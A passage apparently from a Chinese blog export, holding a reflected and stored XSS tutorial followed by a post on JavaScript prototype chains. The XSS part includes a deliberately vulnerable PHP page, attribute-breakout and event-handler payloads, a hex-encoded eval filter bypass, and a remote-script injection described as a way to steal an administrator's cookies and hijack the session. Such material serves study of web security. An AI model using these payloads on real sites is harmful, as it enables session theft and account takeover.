class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE html&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">http-equiv</span>=<span class=\"string\">\"Content-Type\"</span> <span class=\"attr\">content</span>=<span class=\"string\">\"text/html; charset=utf-8\"</span> /&gt;</span> </span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span>XSS原理重现<span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">form</span> <span class=\"attr\">action</span>=<span class=\"string\">\"\"</span> <span class=\"attr\">method</span>=<span class=\"string\">\"get\"</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">\"text\"</span> <span class=\"attr\">name</span>=<span class=\"string\">\"xss_input\"</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">\"submit\"</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">form</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">hr</span>&gt;</span></span><br><span class=\"line\">    /*------多了的代码：123-------*/</span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">h5</span>&gt;</span>你输入的字符为<span class=\"tag\">&lt;/<span class=\"name\">h5</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">br</span> /&gt;</span>123<span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>此时，我要是在输入<code>&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;</code>这种可以被解析的代码时：</p>\n<p>现在页面就显现出xss漏洞了。</p>\n<p><img src=\"/view/posts/12cd2a8e/loadinga.gif\" alt=\"loadinga\"></p>\n<p>之后查看页面代码，就会发现页面上多了一行代码：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE html&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">http-equiv</span>=<span class=\"string\">\"Content-Type\"</span> <span class=\"attr\">content</span>=<span class=\"string\">\"text/html; charset=utf-8\"</span> /&gt;</span> </span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span>XSS原理重现<span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">form</span> <span class=\"attr\">action</span>=<span class=\"string\">\"\"</span> <span class=\"attr\">method</span>=<span class=\"string\">\"get\"</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">\"text\"</span> <span class=\"attr\">name</span>=<span class=\"string\">\"xss_input\"</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">\"submit\"</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">form</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">hr</span>&gt;</span></span><br><span class=\"line\">/*------多了的代码：<span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"javascript\">alert(<span class=\"string\">'xss'</span>)</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span>-------*/</span><br><span class=\"line\">// 代码出现在 br标签 和 body标签中</span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">h5</span>&gt;</span>你输入的字符为<span class=\"tag\">&lt;/<span class=\"name\">h5</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">br</span> /&gt;</span><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"javascript\">alert(<span class=\"string\">'xss'</span>)</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"xss利用输出环境来构造代码\"><a href=\"#xss利用输出环境来构造代码\" class=\"headerlink\" title=\"xss利用输出环境来构造代码\"></a>xss利用输出环境来构造代码</h2><p>现在我要改变 <strong>xss</strong> 攻击：</p>\n<p>以上测试是在，标签中插入<code>scrpit</code>标签达到攻击的目的；现在我想要在<code>html页面标签</code>的属性中插入<strong>xss</strong>攻击代码。因此，当你我输入<code>&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;</code>，不会显示出弹框了。</p>\n<h3 id=\"测试代码\"><a href=\"#测试代码\" class=\"headerlink\" title=\"测试代码\"></a>测试代码</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">&lt;!DOCTYPE html&gt;</span><br><span class=\"line\">&lt;html&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;head&gt;</span><br><span class=\"line\">  &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;</span><br><span class=\"line\">  &lt;title&gt;XSS利用输出的环境来构造代码&lt;/title&gt;</span><br><span class=\"line\">&lt;/head&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;body&gt;</span><br><span class=\"line\">  &lt;center&gt;</span><br><span class=\"line\">    &lt;h6&gt;把我们输入的字符串 输出到input里的value属性里&lt;/h6&gt;</span><br><span class=\"line\">    &lt;form action=&quot;&quot; method=&quot;get&quot;&gt;</span><br><span class=\"line\">      &lt;h6&gt;请输入你想显现的字符串&lt;/h6&gt;</span><br><span class=\"line\">      &lt;input type=&quot;text&quot; name=&quot;xss_input_value&quot; value=&quot;输入&quot;&gt;&lt;br&gt;</span><br><span class=\"line\">      &lt;input type=&quot;submit&quot;&gt;</span><br><span class=\"line\">    &lt;/form&gt;</span><br><span class=\"line\">    &lt;hr&gt;</span><br><span class=\"line\">    &lt;?php</span><br><span class=\"line\">      header(&quot;X-XSS-Protection: 0&quot;);</span><br><span class=\"line\">      error_reporting(0);//加上error_reporting(0);就不会弹出警告了  </span><br><span class=\"line\">      $xss = $_GET[&apos;xss_input_value&apos;];</span><br><span class=\"line\">      if(isset($xss))&#123;</span><br><span class=\"line\">      echo &apos;&lt;input type=&quot;text&quot; value=&quot;&apos;.$xss.&apos;&quot;&gt;&apos;;</span><br><span class=\"line\">      &#125;else&#123;</span><br><span class=\"line\">      echo &apos;&lt;input type=&quot;type&quot; value=&quot;输出&quot;&gt;&apos;;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    ?&gt;</span><br><span class=\"line\">  &lt;/center&gt;</span><br><span class=\"line\">&lt;/body&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;/html&gt;</span><br></pre></td></tr></table></figure>\n<p>页面效果：</p>\n<p><img src=\"/view/posts/12cd2a8e/1562307165857.png\" alt=\"1562307165857\"></p>\n<h3 id=\"输入一\"><a href=\"#输入一\" class=\"headerlink\" title=\"输入一\"></a>输入一</h3><p>当我在输入框输入<code>qwer</code>字符串时，会在输出框显示我输入的字符串：</p>\n<p><img src=\"/view/posts/12cd2a8e/loadinga-1562307323724.gif\" alt=\"loadinga\"></p>\n<p>此时网页代码：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">center</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">h6</span>&gt;</span>把我们输入的字符串 输出到input里的value属性里<span class=\"tag\">&lt;/<span class=\"name\">h6</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">form</span> <span class=\"attr\">action</span>=<span class=\"string\">\"\"</span> <span class=\"attr\">method</span>=<span class=\"string\">\"get\"</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">h6</span>&gt;</span>请输入你想显现的字符串<span class=\"tag\">&lt;/<span class=\"name\">h6</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">\"text\"</span> <span class=\"attr\">name</span>=<span class=\"string\">\"xss_input_value\"</span> <span class=\"attr\">value</span>=<span class=\"string\">\"输入\"</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">br</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">\"submit\"</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;/<span class=\"name\">form</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">hr</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">\"text\"</span> <span class=\"attr\">value</span>=<span class=\"string\">\"qwer\"</span>&gt;</span>  <span class=\"tag\">&lt;/<span class=\"name\">center</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"输入二\"><a href=\"#输入二\" class=\"headerlink\" title=\"输入二\"></a>输入二</h3><p>现在我输入<code>&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;</code>，字符串正常输入，明显的可以看到，并没有弹出对话框：</p>\n<p><img src=\"/view/posts/12cd2a8e/111.gif\" alt=\"111\"></p>\n<p>此时网页代码：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">center</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">h6</span>&gt;</span>把我们输入的字符串 输出到input里的value属性里<span class=\"tag\">&lt;/<span class=\"name\">h6</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">form</span> <span class=\"attr\">action</span>=<span class=\"string\">\"\"</span> <span class=\"attr\">method</span>=<span class=\"string\">\"get\"</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">h6</span>&gt;</span>请输入你想显现的字符串<span class=\"tag\">&lt;/<span class=\"name\">h6</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">\"text\"</span> <span class=\"attr\">name</span>=<span class=\"string\">\"xss_input_value\"</span> <span class=\"attr\">value</span>=<span class=\"string\">\"输入\"</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">br</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">\"submit\"</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">form</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">hr</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">\"text\"</span> <span class=\"attr\">value</span>=<span class=\"string\">\"&lt;script&gt;alert('xss')&lt;/script&gt;\"</span>&gt;</span>  <span class=\"tag\">&lt;/<span class=\"name\">center</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>分析输出代码：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">\"text\"</span> <span class=\"attr\">value</span>=<span class=\"string\">\"&lt;script&gt;alert('xss')&lt;/script&gt;\"</span>&gt;</span>  <span class=\"tag\">&lt;/<span class=\"name\">center</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"输入三\"><a href=\"#输入三\" class=\"headerlink\" title=\"输入三\"></a>输入三</h3><p>如果我输入<code>&quot;&gt;</code>，就会变成：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">\"text\"</span> <span class=\"attr\">value</span>=<span class=\"string\">\"\"</span>&gt;</span> \"&gt;  <span class=\"tag\">&lt;/<span class=\"name\">center</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>input提前闭合了！之后的<code>&quot;&gt;</code>就被舍弃了，变成了普通文本。</p>\n<h3 id=\"输入四\"><a href=\"#输入四\" class=\"headerlink\" title=\"输入四\"></a>输入四</h3><p>如果我输入：<code>&quot;&gt;&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;</code></p>\n<p>显示效果：</p>\n<p><img src=\"/view/posts/12cd2a8e/asc.gif\" alt=\"asc\"></p>\n<h3 id=\"输入五\"><a href=\"#输入五\" class=\"headerlink\" title=\"输入五\"></a>输入五</h3><p>现在我不想显示弹框攻击了，我想触发某种事件实现攻击，那么就输入以下内容：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">\" onmousemove=\"alert('我就测试一下')\"</span><br></pre></td></tr></table></figure>\n<p>显示结果：</p>\n<p><img src=\"/view/posts/12cd2a8e/asc-1562308830171.gif\" alt=\"asc\"></p>\n<p>页面代码：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">center</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">h6</span>&gt;</span>把我们输入的字符串 输出到input里的value属性里<span class=\"tag\">&lt;/<span class=\"name\">h6</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">form</span> <span class=\"attr\">action</span>=<span class=\"string\">\"\"</span> <span class=\"attr\">method</span>=<span class=\"string\">\"get\"</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">h6</span>&gt;</span>请输入你想显现的字符串<span class=\"tag\">&lt;/<span class=\"name\">h6</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">\"text\"</span> <span class=\"attr\">name</span>=<span class=\"string\">\"xss_input_value\"</span> <span class=\"attr\">value</span>=<span class=\"string\">\"输入\"</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">br</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">\"submit\"</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;/<span class=\"name\">form</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">hr</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">\"text\"</span> <span class=\"attr\">value</span>=<span class=\"string\">\"\"</span> <span class=\"attr\">onmousemove</span>=<span class=\"string\">\"alert('我就测试一下')\"</span>\"&gt;</span>  <span class=\"tag\">&lt;/<span class=\"name\">center</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p><strong>说明：输入以后，鼠标在移动是触发事件，形成xss攻击。</strong></p>\n<p>那么，我在<textarea> 标签中显示呢？</textarea></p>\n<p>此时就这样输入：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">textarea</span>&gt;</span> <span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"undefined\">alert(‘xss’)</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span> // 就可以实现弹窗了</span><br></pre></td></tr></table></figure>\n<h2 id=\"过滤的解决办法\"><a href=\"#过滤的解决办法\" class=\"headerlink\" title=\"过滤的解决办法\"></a>过滤的解决办法</h2><p>假如说网站禁止过滤了script 这时该怎么办呢 ？</p>\n<p>那么就需要记住：<strong>只要页面能触发你的js代码</strong></p>\n<p>有哪些方法呢？</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">&lt;!-- 当找不到图片名为1的文件时，执行alert('xss') --&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">img</span> <span class=\"attr\">scr</span>=<span class=\"string\">1</span> <span class=\"attr\">onerror</span>=<span class=\"string\">alert(</span>'<span class=\"attr\">xss</span>')&gt;</span> </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">&lt;!-- 点击s时运行alert('xss') --&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">href</span>=<span class=\"string\">javascrip:alert(</span>'<span class=\"attr\">xss</span>')&gt;</span>s<span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span> </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">&lt;!-- 利用iframe的scr来弹窗 --&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">iframe</span> <span class=\"attr\">src</span>=<span class=\"string\">javascript:alert(</span>'<span class=\"attr\">xss</span>');<span class=\"attr\">height</span>=<span class=\"string\">0</span> <span class=\"attr\">width</span>=<span class=\"string\">0</span> /&gt;</span><span class=\"tag\">&lt;<span class=\"name\">iframe</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"> <span class=\"comment\">&lt;!-- 过滤了alert来执行弹窗 --&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">img</span> <span class=\"attr\">src</span>=<span class=\"string\">\"1\"</span> <span class=\"attr\">onerror</span>=<span class=\"string\">eval(</span>\"\\<span class=\"attr\">x61</span>\\<span class=\"attr\">x6c</span>\\<span class=\"attr\">x65</span>\\<span class=\"attr\">x72</span>\\<span class=\"attr\">x74</span>\\<span class=\"attr\">x28</span>\\<span class=\"attr\">x27</span>\\<span class=\"attr\">x78</span>\\<span class=\"attr\">x73</span>\\<span class=\"attr\">x73</span>\\<span class=\"attr\">x27</span>\\<span class=\"attr\">x29</span>\")&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">img</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"xss的利用\"><a href=\"#xss的利用\" class=\"headerlink\" title=\"xss的利用\"></a>xss的利用</h2><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">scr</span>=<span class=\"string\">\"js_url\"</span>&gt;</span><span class=\"undefined\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">img</span> <span class=\"attr\">src</span>=<span class=\"string\">x</span> <span class=\"attr\">onerror</span>=<span class=\"string\">appendChild(createElement(</span>'<span class=\"attr\">script</span>'))<span class=\"attr\">.src</span>=<span class=\"string\">'js_url'</span> /&gt;</span></span><br></pre></td></tr></table></figure>\n<p><strong>比如我们在网站的留言区输入<code>&lt;script scr=”js_url”&gt;&lt;/script&gt;</code></strong></p>\n<p><strong>当管理员进后台浏览留言的时候，就会触发</strong></p>\n<p><strong>然后管理员的cookies和后台地址还有管理员浏览器版本等等</strong></p>\n<p><strong>你都可以获取到了，再用“桂林老兵cookie欺骗工具”来更改你的cookies，</strong></p>\n<p><strong>就可以不用输入账号 密码 验证码 就可以以管理员的方式来进行登录了。</strong></p>\n"},{"title":"js中的原型及原型链","abbrlink":"8814181e","_content":"\n### 对象\n\n概念：首先，对象是`JavaScript`中的一个基本数据类型，是一种复合值；它用一个（对象）名字命名，把一系列的属性和方法都包装在一个集合中，可以对象名访问这些属性和方法，即属性的无序集合。\n\n#### 通过字面量创建对象\n\n```javascript\n//通过字面量创建对象\nvar obj1 = {\n        name:'Jack',\n        age: 18\n      }\n```\n\n#### 通过系统自带的构造函数构造对象\n\n```JavaScript\n// 通过系统自带的构造函数构造对象\n// 其他构造函数有：new Array(),new Number,new Date(),new Boolean()\n var obj2 = new Object();\n obj2.name = 'Jack';\n obj2.age = 18;\n```\n\n#### 通过自定义函数构造对象\n\n```javascript\n// 通过自定义函数构造对象\n// 为了和普通函数区别，构造函数命名首字母要大写（帕斯卡命名法）\n    function Obj3(name,age) {\n      this.name = name;\n      this.age = age;\n      this.sayHi = function () {\n        alert(this.name)\n      };\n    }\n    var dx1 = new Obj3('Jack', 18);\n    var dx2 = new Obj3('Brush', 18);\n```\n\n####  new关键字\n\n首先，我先说下自定义构造函数创建对象的基本流程，使用new和不适用new差别很大，不用new的话，则`Obj3(name)`就作为一个普通的函数执行（只是函数名的首字母大写了），没有返回值，那么默认返回的是`undefined`，而用`new`关键字后，JS就会把该函数作为一个构造函数看待，经过一系列的隐式操作，返回值是一个对象了。\n\nnew关键字的“隐式操作”：\n\n①在内存中创建一个空的Object类型的对象----看不到\n\n②让this关键字指向这个空的对象（将构造函数的作用域赋给新对象）----看不到\n\n```javascript\n// ① ② 的执行过程\nvar this = Object.creat(Obj3.prototype);\n// this 指向 Obj3.prototype(后面讲到)\n// 可以看出构造函数创建对象的最根本原理是借用Object.create()方法来实现的，只不过被封装功能化了\n```\n\n在前面的例子中，`dx1`和`dx2`分别保存着`Obj3`的一个不同的实例。这俩个对象都有有一个`constructor`（构造函数）的属性，该属性指向`Obj3`，如下：\n\n```javascript\nconsole.log(dx1.constructor  == Obj3) // true\nconsole.log(dx2.constructor  == Obj3) // true\n```\n\n对象的constructor属性最初用来表示对象类型的。但是，检测对象类型，还是`instanceof`操作符要更可靠一些-----用来检测一个对象在其原型链中，是否存在一个构造函数的`prototype`属性。\n\n我们在这个例子中创建的所有对象即使`Object`的实例，同时也是`Obj3`的实例，这一点可以通过`instanceof`操作符可以得到验证。\n\n```javascript\n    console.log(dx1 instanceof Obj3);  // true\n    console.log(dx1 instanceof Object);  // true\n    console.log(dx2 instanceof Obj3);  // true\n    console.log(dx2 instanceof Object);  // true\n // dx1 和 dx2 之所以同时是Object的实例，是因为所有的对象均继承自Object\n```\n\n③通过this给这个对象添加属性和方法---看得见\n\n```javascript\n// this.name = 'Jack';\n   this.age = 18;\n```\n\n④将这个对象返回给用`new`关键字调用的构造函数`Obj3(name)`的调用者（`dx1`）\n\n```javascript\nreturn this;\n```\n\n注：`Object`在JS中，所有不同类型的对象，都直接或间接的集成于它。\n\n\n\n### 原型对象和原型链\n\n#### 原型\n\n我们所创建的每一个函数都有一个 prototype （原型）的属性，这个属性是一个指针，指向一个对象，而这个对象的用途包含可以由特定类型的所有实例共享的属性和方法。 \n\n那么prototype就可以通过调用构造函数而创建的那个对象实例的原型对象。使用原型对象的好处是可以让所有对象实例共享它所包含的属性和方法。换句话说，不必在构造函数中第一对象实例的信息，而是可以将这些信息直接添加到原型对象中去，那么上面的Obj3（）函数就可以写成这样：\n\n```javascript\n    function Obj3(name,age) {\n      this.name = name;\n      this.age = age;\n    }\n\tObj3.prototype.sayHi = function () {\n      alert(this.name)\n\t}\n    var dx1 = new Obj3('Jack', 18);\n    var dx2 = new Obj3('Brush', 18);\n```\n\n在默认情况下，所有原型对象都会自动获得一个constructor（构造函数）属性，这个属性包含一个指向prototype属性所在函数的指针。就拿上面的例子来说，Obj3.prototype.constructor指向Obj3。而通过这个构造函数，我们还可以继续为原型对象添加其他属性和方法。\n\n当构造函数创建一个新实例后，该实例的内部将包含一个指针（内部属性），指向构造函数的原型方法。在每一个对象都支持一个属性：\"_ _proto_ _\"。\n\n我们可以通过isPrototype()方法来确定对象之间是否存在这个关系。从本质上讲，如果[Prototype]指向调用isPrototype()方法的对象（Obj3.prototype），那么这个方法就返回true：\n\n```javascript\n    console.log(dx1.prototype.isPrototypeOf(Obj3)); // true\n    console.log(dx2.prototype.isPrototypeOf(Obj3)); // true\n```\n\n使用hasOwnProperty()可以检测一个属性是否存在在实例中，还是存在在原型中。这个方法（从Object继承来的）只是给定属性存在在对象实例中，才会返回true；存在在原型中，返回false。\n\n####  原型对象的原型\n\n所有的原型应用类型（Object、Array、String）都在其构造函数的原型上定义了方法。在Array.prototype中可以找到sort（）方法；在String.prototype中可以找到substring（）方法，如下：\n\n```javascript\n console.log(Array.prototype.sort); // ƒ sort() { [native code] }\n console.log(String.prototype.substring); // ƒ substring() { [native code] }\n```\n\n### 原型链\n\n原型和实例的关系：每个构造函数都有一个原型对象，原型对象都包含一个指向构造函数的指针，而实例都包含一个指向原型对象的内部指针。如果，我们让这个原型对象等于另一个类型的实例，显然，此时的原型对象包含一个指向另一个原型的指针，相应的，另一个原型中野包含着指向另另一个类型的实例，那么，层层递进，就构成了实例与原型的链条，这就是原型链的基本概念。\n\n我们知道，所有引用类型默认都继承了Object，而这个继承也是通过原型链实现的。所有函数的默认原型都是Object的实例，因此默认原型都包含一个内部指针，指向`Object.prototype`。这正是所有自定义类型都会继承`toString()、valueOf()`等默认方式的根本原因。\n\n![原型](/js中的原型及原型链/prototype.jpg)\n","source":"_posts/js中的原型及原型链.md","raw":"---\ntitle: js中的原型及原型链\ncategories:\n  - JavasCript\ntags:\n  - 